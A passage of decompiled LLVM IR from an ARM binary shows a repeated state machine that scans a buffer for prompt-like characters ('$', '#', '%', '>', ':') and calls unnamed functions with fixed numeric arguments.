  %v7_11224 = icmp eq i8 %v3_11240, 35
  store i1 %v7_11224, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11224, label %dec_label_pc_11250, label %dec_label_pc_1122c

dec_label_pc_1122c:                               ; preds = %dec_label_pc_11224
  %v7_1122c = icmp eq i8 %v3_11240, 37
  store i1 %v7_1122c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1122c, label %dec_label_pc_11250, label %dec_label_pc_11234

dec_label_pc_11234:                               ; preds = %dec_label_pc_1122c
  %v1_11234 = add i32 %v0_11250, -1
  store i32 %v1_11234, i32* %r0.global-to-local, align 4
  %v7_11234 = icmp eq i32 %v0_11250, 1
  store i1 %v7_11234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11234, label %dec_label_pc_10fd8thread-pre-split, label %dec_label_pc_1123c

dec_label_pc_1123c:                               ; preds = %dec_label_pc_11208, %dec_label_pc_11234
  %v0_11250 = phi i32 [ %v1_11234, %dec_label_pc_11234 ], [ %v1_1120c, %dec_label_pc_11208 ]
  %v2_1123c = add i32 %v0_11250, %v0_11054
  store i32 %v2_1123c, i32* %r3.global-to-local, align 4
  %v1_11240 = add i32 %v2_1123c, 28
  %v2_11240 = inttoptr i32 %v1_11240 to i8*
  %v3_11240 = load i8, i8* %v2_11240, align 1
  %v4_11240 = zext i8 %v3_11240 to i32
  store i32 %v4_11240, i32* %r3.global-to-local, align 4
  %v7_11244 = icmp eq i8 %v3_11240, 62
  store i1 %v7_11244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11244, label %dec_label_pc_11250, label %bb302

bb302:                                            ; preds = %dec_label_pc_1123c
  %v8_11248 = icmp eq i8 %v3_11240, 58
  store i1 %v8_11248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11248, label %dec_label_pc_11250, label %dec_label_pc_1121c

dec_label_pc_11250:                               ; preds = %dec_label_pc_1123c, %bb302, %dec_label_pc_1122c, %dec_label_pc_11224, %dec_label_pc_1121c
  %v1_11250 = add i32 %v0_11250, 1
  store i32 %v1_11250, i32* @r7, align 4
  %v7_11254 = icmp eq i32 %v0_11250, -2
  store i1 %v7_11254, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11254, label %dec_label_pc_10fd8thread-pre-split, label %dec_label_pc_1125c

dec_label_pc_1125c:                               ; preds = %dec_label_pc_11250
  %v2_1125c = icmp eq i32 %v1_11250, 0
  store i1 %v2_1125c, i1* %cpsr_z.global-to-local, align 1
  %tmp303 = icmp slt i32 %v1_11250, 1
  br i1 %tmp303, label %dec_label_pc_11160, label %dec_label_pc_11264

dec_label_pc_11264:                               ; preds = %dec_label_pc_1125c
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_11268 = call i32 @function_11c08(i32 21)
  store i32 %v2_11270, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_11278 = call i32 @function_11b24(i32 21, i32* nonnull %stack_var_-56)
  store i32 %v3_11278, i32* %r0.global-to-local, align 4
  %v3_1127c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1127c, i32* %r2.global-to-local, align 4
  store i32 %v3_11278, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11288 = load i32, i32* @r5, align 4
  %v1_11288 = add i32 %v0_11288, 4
  %v2_11288 = inttoptr i32 %v1_11288 to i32*
  %v3_11288 = load i32, i32* %v2_11288, align 4
  store i32 %v3_11288, i32* %r0.global-to-local, align 4
  %v4_1128c = inttoptr i32 %v3_11278 to i32*
  %v5_1128c = call i32 @function_13700(i32 %v3_11288, i32* %v4_1128c, i32 %v3_1127c, i32 16384)
  store i32 %v5_1128c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1129c = load i32, i32* @r5, align 4
  %v1_1129c = add i32 %v0_1129c, 4
  %v2_1129c = inttoptr i32 %v1_1129c to i32*
  %v3_1129c = load i32, i32* %v2_1129c, align 4
  store i32 %v3_1129c, i32* %r0.global-to-local, align 4
  %v6_112a0 = call i32 @function_13700(i32 %v3_1129c, i32* bitcast ([3 x i8]* @global_var_15750.34 to i32*), i32 2, i32 16384)
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_112a8 = call i32 @function_11b50(i32 21)
  store i32 %v1_112a8, i32* %r0.global-to-local, align 4
  %v0_112ac = load i32, i32* @r5, align 4
  %v1_112ac = add i32 %v0_112ac, 24
  %v2_112ac = inttoptr i32 %v1_112ac to i32*
  %v3_112ac = load i32, i32* %v2_112ac, align 4
  store i32 %v3_112ac, i32* %ip.global-to-local, align 4
  store i32 6, i32* %r1.global-to-local, align 4
  %v2_112b4 = add i32 %v0_112ac, 12
  %v3_112b4 = inttoptr i32 %v2_112b4 to i32*
  store i32 6, i32* %v3_112b4, align 4
  br label %dec_label_pc_11790

dec_label_pc_112bc:                               ; preds = %dec_label_pc_11054
  %v1_112bc = add i32 %v0_11054, 24
  %v2_112bc = inttoptr i32 %v1_112bc to i32*
  %v3_112bc = load i32, i32* %v2_112bc, align 4
  store i32 %v3_112bc, i32* %ip.global-to-local, align 4
  %v1_112c0 = add i32 %v3_112bc, -1
  store i32 %v1_112c0, i32* %r0.global-to-local, align 4
  %v2_112c4 = icmp eq i32 %v1_112c0, 0
  store i1 %v2_112c4, i1* %cpsr_z.global-to-local, align 1
  %v5_112c8 = icmp sgt i32 %v1_112c0, 0
  br i1 %v5_112c8, label %dec_label_pc_112f0, label %dec_label_pc_10fd8thread-pre-split.thread

dec_label_pc_112d0:                               ; preds = %bb304
  %v7_112d0 = icmp eq i8 %v3_112f4, 36
  store i1 %v7_112d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112d0, label %dec_label_pc_11304, label %dec_label_pc_112d8

dec_label_pc_112d8:                               ; preds = %dec_label_pc_112d0
  %v7_112d8 = icmp eq i8 %v3_112f4, 35
  store i1 %v7_112d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112d8, label %dec_label_pc_11304, label %dec_label_pc_112e0

dec_label_pc_112e0:                               ; preds = %dec_label_pc_112d8
  %v7_112e0 = icmp eq i8 %v3_112f4, 37
  store i1 %v7_112e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112e0, label %dec_label_pc_11304, label %dec_label_pc_112e8

dec_label_pc_112e8:                               ; preds = %dec_label_pc_112e0
  %v1_112e8 = add i32 %v0_11304, -1
  store i32 %v1_112e8, i32* %r0.global-to-local, align 4
  %v7_112e8 = icmp eq i32 %v0_11304, 1
  store i1 %v7_112e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112e8, label %dec_label_pc_10fd8thread-pre-split, label %dec_label_pc_112f0

dec_label_pc_112f0:                               ; preds = %dec_label_pc_112bc, %dec_label_pc_112e8
  %v0_11304 = phi i32 [ %v1_112e8, %dec_label_pc_112e8 ], [ %v1_112c0, %dec_label_pc_112bc ]
  %v2_112f0 = add i32 %v0_11304, %v0_11054
  store i32 %v2_112f0, i32* %r3.global-to-local, align 4
  %v1_112f4 = add i32 %v2_112f0, 28
  %v2_112f4 = inttoptr i32 %v1_112f4 to i8*
  %v3_112f4 = load i8, i8* %v2_112f4, align 1
  %v4_112f4 = zext i8 %v3_112f4 to i32
  store i32 %v4_112f4, i32* %r3.global-to-local, align 4
  %v7_112f8 = icmp eq i8 %v3_112f4, 62
  store i1 %v7_112f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112f8, label %dec_label_pc_11304, label %bb304

bb304:                                            ; preds = %dec_label_pc_112f0
  %v8_112fc = icmp eq i8 %v3_112f4, 58
  store i1 %v8_112fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_112fc, label %dec_label_pc_11304, label %dec_label_pc_112d0

dec_label_pc_11304:                               ; preds = %dec_label_pc_112f0, %bb304, %dec_label_pc_112e0, %dec_label_pc_112d8, %dec_label_pc_112d0
  %v1_11304 = add i32 %v0_11304, 1
  store i32 %v1_11304, i32* @r7, align 4
  %v7_11308 = icmp eq i32 %v0_11304, -2
  store i1 %v7_11308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11308, label %dec_label_pc_10fd8thread-pre-split, label %dec_label_pc_11310

dec_label_pc_11310:                               ; preds = %dec_label_pc_11304
  %v2_11310 = icmp eq i32 %v1_11304, 0
  store i1 %v2_11310, i1* %cpsr_z.global-to-local, align 1
  %tmp305 = icmp slt i32 %v1_11304, 1
  br i1 %tmp305, label %dec_label_pc_11160, label %dec_label_pc_11318

dec_label_pc_11318:                               ; preds = %dec_label_pc_11310
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_1131c = call i32 @function_11c08(i32 22)
  store i32 %v2_11324, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_1132c = call i32 @function_11b24(i32 22, i32* nonnull %stack_var_-48)
  store i32 %v3_1132c, i32* %r0.global-to-local, align 4
  %v3_11330 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_11330, i32* %r2.global-to-local, align 4
  store i32 %v3_1132c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1133c = load i32, i32* @r5, align 4
  %v1_1133c = add i32 %v0_1133c, 4
  %v2_1133c = inttoptr i32 %v1_1133c to i32*
  %v3_1133c = load i32, i32* %v2_1133c, align 4
  store i32 %v3_1133c, i32* %r0.global-to-local, align 4
  %v4_11340 = inttoptr i32 %v3_1132c to i32*
  %v5_11340 = call i32 @function_13700(i32 %v3_1133c, i32* %v4_11340, i32 %v3_11330, i32 16384)
  store i32 %v5_11340, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11350 = load i32, i32* @r5, align 4
  %v1_11350 = add i32 %v0_11350, 4
  %v2_11350 = inttoptr i32 %v1_11350 to i32*
  %v3_11350 = load i32, i32* %v2_11350, align 4
  store i32 %v3_11350, i32* %r0.global-to-local, align 4
  %v6_11354 = call i32 @function_13700(i32 %v3_11350, i32* bitcast ([3 x i8]* @global_var_15750.34 to i32*), i32 2, i32 16384)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_1135c = call i32 @function_11b50(i32 22)
  store i32 %v1_1135c, i32* %r0.global-to-local, align 4
  %v0_11360 = load i32, i32* @r5, align 4
  %v1_11360 = add i32 %v0_11360, 24
  %v2_11360 = inttoptr i32 %v1_11360 to i32*
  %v3_11360 = load i32, i32* %v2_11360, align 4
  store i32 %v3_11360, i32* %ip.global-to-local, align 4
  store i32 7, i32* %r1.global-to-local, align 4
  %v2_11368 = add i32 %v0_11360, 12
  %v3_11368 = inttoptr i32 %v2_11368 to i32*
  store i32 7, i32* %v3_11368, align 4
  br label %dec_label_pc_11790

dec_label_pc_11458:                               ; preds = %dec_label_pc_11054
  %v1_11458 = add i32 %v0_11054, 24
  %v2_11458 = inttoptr i32 %v1_11458 to i32*
  %v3_11458 = load i32, i32* %v2_11458, align 4
  store i32 %v3_11458, i32* %ip.global-to-local, align 4
  %v1_1145c = add i32 %v3_11458, -1
  store i32 %v1_1145c, i32* %r0.global-to-local, align 4
  %v2_11460 = icmp eq i32 %v1_1145c, 0
  store i1 %v2_11460, i1* %cpsr_z.global-to-local, align 1
  %v5_11464 = icmp sgt i32 %v1_1145c, 0
  br i1 %v5_11464, label %dec_label_pc_11484, label %dec_label_pc_118d4

dec_label_pc_1146c:                               ; preds = %bb306
  %v7_1146c = icmp eq i8 %v3_11488, 36
  store i1 %v7_1146c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1146c, label %dec_label_pc_11498, label %dec_label_pc_11474

dec_label_pc_11474:                               ; preds = %dec_label_pc_1146c
  %v7_11474 = icmp eq i8 %v3_11488, 35
  store i1 %v7_11474, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11474, label %dec_label_pc_11498, label %dec_label_pc_1147c

dec_label_pc_1147c:                               ; preds = %dec_label_pc_11474
  %v1_1147c = add i32 %v0_11498, -1
  store i32 %v1_1147c, i32* %r0.global-to-local, align 4
  %v7_1147c = icmp eq i32 %v0_11498, 1
  store i1 %v7_1147c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1147c, label %dec_label_pc_118d4, label %dec_label_pc_11484

dec_label_pc_11484:                               ; preds = %dec_label_pc_11458, %dec_label_pc_1147c
  %v0_11498 = phi i32 [ %v1_1147c, %dec_label_pc_1147c ], [ %v1_1145c, %dec_label_pc_11458 ]
  %v2_11484 = add i32 %v0_11498, %v0_11054
  store i32 %v2_11484, i32* %r3.global-to-local, align 4
  %v1_11488 = add i32 %v2_11484, 28
  %v2_11488 = inttoptr i32 %v1_11488 to i8*
  %v3_11488 = load i8, i8* %v2_11488, align 1
  %v4_11488 = zext i8 %v3_11488 to i32
  store i32 %v4_11488, i32* %r3.global-to-local, align 4
  %v7_1148c = icmp eq i8 %v3_11488, 62
  store i1 %v7_1148c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1148c, label %dec_label_pc_11498, label %bb306

bb306:                                            ; preds = %dec_label_pc_11484
  %v8_11490 = icmp eq i8 %v3_11488, 58
  store i1 %v8_11490, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11490, label %dec_label_pc_11498, label %dec_label_pc_1146c

dec_label_pc_11498:                               ; preds = %dec_label_pc_11484, %bb306, %dec_label_pc_11474, %dec_label_pc_1146c
  %v1_11498 = add i32 %v0_11498, 1
  store i32 %v1_11498, i32* @r7, align 4
  %v7_1149c = icmp eq i32 %v0_11498, -2
  store i1 %v7_1149c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1149c, label %dec_label_pc_118d4, label %dec_label_pc_114a4

dec_label_pc_114a4:                               ; preds = %dec_label_pc_11498, %dec_label_pc_118d4
  %v0_114a4 = phi i32 [ %v5_118e4, %dec_label_pc_118d4 ], [ %v1_11498, %dec_label_pc_11498 ]
  %v2_114a4 = icmp eq i32 %v0_114a4, 0
  store i1 %v2_114a4, i1* %cpsr_z.global-to-local, align 1
  %tmp307 = icmp slt i32 %v0_114a4, 1
  br i1 %tmp307, label %dec_label_pc_11160, label %dec_label_pc_114ac

dec_label_pc_114ac:                               ; preds = %dec_label_pc_114a4
  %v0_114ac = load i32, i32* @r5, align 4
  %v1_114ac = inttoptr i32 %v0_114ac to i32*
  %v2_114ac = load i32, i32* %v1_114ac, align 4
  store i32 %v2_114ac, i32* %r3.global-to-local, align 4
  %v1_114b0 = add i32 %v0_114ac, 4
  %v2_114b0 = inttoptr i32 %v1_114b0 to i32*
  %v3_114b0 = load i32, i32* %v2_114b0, align 4
  store i32 %v3_114b0, i32* %r0.global-to-local, align 4
  %v1_114b4 = add i32 %v2_114ac, 13
  %v2_114b4 = inttoptr i32 %v1_114b4 to i8*
  %v3_114b4 = load i8, i8* %v2_114b4, align 1
  %v4_114b4 = zext i8 %v3_114b4 to i32
  store i32 %v4_114b4, i32* %r2.global-to-local, align 4
  %v1_114b8 = add i32 %v2_114ac, 4
  %v2_114b8 = inttoptr i32 %v1_114b8 to i32*
  %v3_114b8 = load i32, i32* %v2_114b8, align 4
  store i32 %v3_114b8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_114c0 = inttoptr i32 %v3_114b8 to i32*
  %v5_114c0 = call i32 @function_13700(i32 %v3_114b0, i32* %v4_114c0, i32 %v4_114b4, i32 16384)
  store i32 %v5_114c0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r1.global-to-local, align 4
  %v0_114c8 = load i32, i32* @r5, align 4
  %v1_114c8 = add i32 %v0_114c8, 4
  %v2_114c8 = inttoptr i32 %v1_114c8 to i32*
  %v3_114c8 = load i32, i32* %v2_114c8, align 4
  store i32 %v3_114c8, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_114d4 = call i32 @function_13700(i32 %v3_114c8, i32* bitcast ([3 x i8]* @global_var_15750.34 to i32*), i32 2, i32 16384)
  store i32 %v6_114d4, i32* %r0.global-to-local, align 4
  %v0_114d8 = load i32, i32* @r5, align 4
  %v1_114d8 = add i32 %v0_114d8, 24
  %v2_114d8 = inttoptr i32 %v1_114d8 to i32*
  %v3_114d8 = load i32, i32* %v2_114d8, align 4
  store i32 %v3_114d8, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_114e0 = add i32 %v0_114d8, 12
  %v3_114e0 = inttoptr i32 %v2_114e0 to i32*
  store i32 5, i32* %v3_114e0, align 4
  br label %dec_label_pc_11790

dec_label_pc_114e8:                               ; preds = %dec_label_pc_11054
  %v1_114e8 = add i32 %v0_11054, 24
  %v2_114e8 = inttoptr i32 %v1_114e8 to i32*
  %v3_114e8 = load i32, i32* %v2_114e8, align 4
  store i32 %v3_114e8, i32* %ip.global-to-local, align 4
  %v1_114ec = add i32 %v3_114e8, -1
  store i32 %v1_114ec, i32* %r0.global-to-local, align 4
  %v2_114f0 = icmp eq i32 %v1_114ec, 0
  store i1 %v2_114f0, i1* %cpsr_z.global-to-local, align 1
  %v5_114f4 = icmp sgt i32 %v1_114ec, 0
  br i1 %v5_114f4, label %dec_label_pc_1151c, label %dec_label_pc_10fd8thread-pre-split.thread

dec_label_pc_114fc:                               ; preds = %bb308
  %v7_114fc = icmp eq i8 %v3_11520, 36
  store i1 %v7_114fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_114fc, label %dec_label_pc_11530, label %dec_label_pc_11504

dec_label_pc_11504:                               ; preds = %dec_label_pc_114fc
  %v7_11504 = icmp eq i8 %v3_11520, 35
  store i1 %v7_11504, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11504, label %dec_label_pc_11530, label %dec_label_pc_1150c

dec_label_pc_1150c:                               ; preds = %dec_label_pc_11504
  %v7_1150c = icmp eq i8 %v3_11520, 37
  store i1 %v7_1150c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1150c, label %dec_label_pc_11530, label %dec_label_pc_11514

dec_label_pc_11514:                               ; preds = %dec_label_pc_1150c
  %v1_11514 = add i32 %v0_11530, -1
  store i32 %v1_11514, i32* %r0.global-to-local, align 4
  %v7_11514 = icmp eq i32 %v0_11530, 1
  store i1 %v7_11514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11514, label %dec_label_pc_10fd8thread-pre-split, label %dec_label_pc_1151c

dec_label_pc_1151c:                               ; preds = %dec_label_pc_114e8, %dec_label_pc_11514
  %v0_11530 = phi i32 [ %v1_11514, %dec_label_pc_11514 ], [ %v1_114ec, %dec_label_pc_114e8 ]
  %v2_1151c = add i32 %v0_11530, %v0_11054
  store i32 %v2_1151c, i32* %r3.global-to-local, align 4
  %v1_11520 = add i32 %v2_1151c, 28
  %v2_11520 = inttoptr i32 %v1_11520 to i8*
  %v3_11520 = load i8, i8* %v2_11520, align 1
  %v4_11520 = zext i8 %v3_11520 to i32
  store i32 %v4_11520, i32* %r3.global-to-local, align 4
  %v7_11524 = icmp eq i8 %v3_11520, 62
  store i1 %v7_11524, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11524, label %dec_label_pc_11530, label %bb308

bb308:                                            ; preds = %dec_label_pc_1151c
  %v8_11528 = icmp eq i8 %v3_11520, 58
  store i1 %v8_11528, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11528, label %dec_label_pc_11530, label %dec_label_pc_114fc

dec_label_pc_11530:                               ; preds = %dec_label_pc_1151c, %bb308, %dec_label_pc_1150c, %dec_label_pc_11504, %dec_label_pc_114fc
  %v1_11530 = add i32 %v0_11530, 1
  store i32 %v1_11530, i32* @r7, align 4
  %v7_11534 = icmp eq i32 %v0_11530, -2
  store i1 %v7_11534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11534, label %dec_label_pc_10fd8thread-pre-split, label %dec_label_pc_1153c

dec_label_pc_1153c:                               ; preds = %dec_label_pc_11530
  %v2_1153c = icmp eq i32 %v1_11530, 0
  store i1 %v2_1153c, i1* %cpsr_z.global-to-local, align 1
  %tmp309 = icmp slt i32 %v1_11530, 1
  br i1 %tmp309, label %dec_label_pc_11160, label %dec_label_pc_11544

dec_label_pc_11544:                               ; preds = %dec_label_pc_1153c
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_11548 = call i32 @function_11c08(i32 20)
  store i32 %v2_11324, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r0.global-to-local, align 4
  %v3_11558 = call i32 @function_11b24(i32 20, i32* nonnull %stack_var_-48)
  store i32 %v3_11558, i32* %r0.global-to-local, align 4
  %v3_1155c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1155c, i32* %r2.global-to-local, align 4
  store i32 %v3_11558, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11568 = load i32, i32* @r5, align 4
  %v1_11568 = add i32 %v0_11568, 4
  %v2_11568 = inttoptr i32 %v1_11568 to i32*
  %v3_11568 = load i32, i32* %v2_11568, align 4
  store i32 %v3_11568, i32* %r0.global-to-local, align 4
  %v4_1156c = inttoptr i32 %v3_11558 to i32*
  %v5_1156c = call i32 @function_13700(i32 %v3_11568, i32* %v4_1156c, i32 %v3_1155c, i32 16384)
  store i32 %v5_1156c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1157c = load i32, i32* @r5, align 4
  %v1_1157c = add i32 %v0_1157c, 4
  %v2_1157c = inttoptr i32 %v1_1157c to i32*
  %v3_1157c = load i32, i32* %v2_1157c, align 4
  store i32 %v3_1157c, i32* %r0.global-to-local, align 4
  %v6_11580 = call i32 @function_13700(i32 %v3_1157c, i32* bitcast ([3 x i8]* @global_var_15750.34 to i32*), i32 2, i32 16384)
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_11588 = call i32 @function_11b50(i32 20)
  store i32 %v1_11588, i32* %r0.global-to-local, align 4
  %v0_1158c = load i32, i32* @r5, align 4
  %v1_1158c = add i32 %v0_1158c, 24
  %v2_1158c = inttoptr i32 %v1_1158c to i32*
  %v3_1158c = load i32, i32* %v2_1158c, align 4
  store i32 %v3_1158c, i32* %ip.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_11594 = add i32 %v0_1158c, 12
  %v3_11594 = inttoptr i32 %v2_11594 to i32*
  store i32 8, i32* %v3_11594, align 4
  br label %dec_label_pc_11790

dec_label_pc_1159c:                               ; preds = %dec_label_pc_11054
  %v1_1159c = add i32 %v0_11054, 24
  %v2_1159c = inttoptr i32 %v1_1159c to i32*
  %v3_1159c = load i32, i32* %v2_1159c, align 4
  store i32 %v3_1159c, i32* %ip.global-to-local, align 4
  %v1_115a0 = add i32 %v3_1159c, -1
  store i32 %v1_115a0, i32* %r0.global-to-local, align 4
  %v2_115a4 = icmp eq i32 %v1_115a0, 0
  store i1 %v2_115a4, i1* %cpsr_z.global-to-local, align 1
  %v5_115a8 = icmp sgt i32 %v1_115a0, 0
  br i1 %v5_115a8, label %dec_label_pc_115d0, label %dec_label_pc_10fd8thread-pre-split.thread

dec_label_pc_115b0:                               ; preds = %bb310
  %v7_115b0 = icmp eq i8 %v3_115d4, 36
  store i1 %v7_115b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115b0, label %dec_label_pc_115e4, label %dec_label_pc_115b8

dec_label_pc_115b8:                               ; preds = %dec_label_pc_115b0
  %v7_115b8 = icmp eq i8 %v3_115d4, 35
  store i1 %v7_115b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115b8, label %dec_label_pc_115e4, label %dec_label_pc_115c0

dec_label_pc_115c0:                               ; preds = %dec_label_pc_115b8
  %v7_115c0 = icmp eq i8 %v3_115d4, 37
  store i1 %v7_115c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115c0, label %dec_label_pc_115e4, label %dec_label_pc_115c8

dec_label_pc_115c8:                               ; preds = %dec_label_pc_115c0
  %v1_115c8 = add i32 %v0_115e4, -1
  store i32 %v1_115c8, i32* %r0.global-to-local, align 4
  %v7_115c8 = icmp eq i32 %v0_115e4, 1
  store i1 %v7_115c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115c8, label %dec_label_pc_10fd8thread-pre-split, label %dec_label_pc_115d0

dec_label_pc_115d0:                               ; preds = %dec_label_pc_1159c, %dec_label_pc_115c8
  %v0_115e4 = phi i32 [ %v1_115c8, %dec_label_pc_115c8 ], [ %v1_115a0, %dec_label_pc_1159c ]
  %v2_115d0 = add i32 %v0_115e4, %v0_11054
  store i32 %v2_115d0, i32* %r3.global-to-local, align 4
  %v1_115d4 = add i32 %v2_115d0, 28
  %v2_115d4 = inttoptr i32 %v1_115d4 to i8*
  %v3_115d4 = load i8, i8* %v2_115d4, align 1
  %v4_115d4 = zext i8 %v3_115d4 to i32
  store i32 %v4_115d4, i32* %r3.global-to-local, align 4
  %v7_115d8 = icmp eq i8 %v3_115d4, 62
  store i1 %v7_115d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115d8, label %dec_label_pc_115e4, label %bb310

bb310:                                            ; preds = %dec_label_pc_115d0
  %v8_115dc = icmp eq i8 %v3_115d4, 58
  store i1 %v8_115dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_115dc, label %dec_label_pc_115e4, label %dec_label_pc_115b0

dec_label_pc_115e4:                               ; preds = %dec_label_pc_115d0, %bb310, %dec_label_pc_115c0, %dec_label_pc_115b8, %dec_label_pc_115b0
  %v1_115e4 = add i32 %v0_115e4, 1
  store i32 %v1_115e4, i32* @r7, align 4
  %v7_115e8 = icmp eq i32 %v0_115e4, -2
  store i1 %v7_115e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115e8, label %dec_label_pc_10fd8thread-pre-split, label %dec_label_pc_115f0

dec_label_pc_115f0:                               ; preds = %dec_label_pc_115e4
  %v2_115f0 = icmp eq i32 %v1_115e4, 0
  store i1 %v2_115f0, i1* %cpsr_z.global-to-local, align 1
  %tmp311 = icmp slt i32 %v1_115e4, 1
  br i1 %tmp311, label %dec_label_pc_11160, label %dec_label_pc_115f8

dec_label_pc_115f8:                               ; preds = %dec_label_pc_115f0
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_115fc = call i32 @function_11c08(i32 23)
  store i32 %v2_11270, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v3_1160c = call i32 @function_11b24(i32 23, i32* nonnull %stack_var_-56)
  store i32 %v3_1160c, i32* %r0.global-to-local, align 4
  %v3_11610 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11610, i32* %r2.global-to-local, align 4
  store i32 %v3_1160c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1161c = load i32, i32* @r5, align 4
  %v1_1161c = add i32 %v0_1161c, 4
  %v2_1161c = inttoptr i32 %v1_1161c to i32*
  %v3_1161c = load i32, i32* %v2_1161c, align 4
  store i32 %v3_1161c, i32* %r0.global-to-local, align 4
  %v4_11620 = inttoptr i32 %v3_1160c to i32*
  %v5_11620 = call i32 @function_13700(i32 %v3_1161c, i32* %v4_11620, i32 %v3_11610, i32 16384)
  store i32 %v5_11620, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11630 = load i32, i32* @r5, align 4
  %v1_11630 = add i32 %v0_11630, 4
  %v2_11630 = inttoptr i32 %v1_11630 to i32*
  %v3_11630 = load i32, i32* %v2_11630, align 4
  store i32 %v3_11630, i32* %r0.global-to-local, align 4
  %v6_11634 = call i32 @function_13700(i32 %v3_11630, i32* bitcast ([3 x i8]* @global_var_15750.34 to i32*), i32 2, i32 16384)
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_1163c = call i32 @function_11b50(i32 23)
  store i32 %v1_1163c, i32* %r0.global-to-local, align 4
  %v0_11640 = load i32, i32* @r5, align 4
  %v1_11640 = add i32 %v0_11640, 24
  %v2_11640 = inttoptr i32 %v1_11640 to i32*
  %v3_11640 = load i32, i32* %v2_11640, align 4
  store i32 %v3_11640, i32* %ip.global-to-local, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_11648 = add i32 %v0_11640, 12
  %v3_11648 = inttoptr i32 %v2_11648 to i32*
  store i32 9, i32* %v3_11648, align 4
  br label %dec_label_pc_11790

dec_label_pc_11650:                               ; preds = %dec_label_pc_11054
  %v1_11650 = add i32 %v0_11054, 24
  %v2_11650 = inttoptr i32 %v1_11650 to i32*
  %v3_11650 = load i32, i32* %v2_11650, align 4
  store i32 %v3_11650, i32* %ip.global-to-local, align 4
  %v1_11654 = add i32 %v3_11650, -1
  store i32 %v1_11654, i32* %r0.global-to-local, align 4
  %v2_11658 = icmp eq i32 %v1_11654, 0
  store i1 %v2_11658, i1* %cpsr_z.global-to-local, align 1
  %v5_1165c = icmp sgt i32 %v1_11654, 0
  br i1 %v5_1165c, label %dec_label_pc_11684, label %dec_label_pc_10fd8thread-pre-split.thread

dec_label_pc_11664:                               ; preds = %bb312
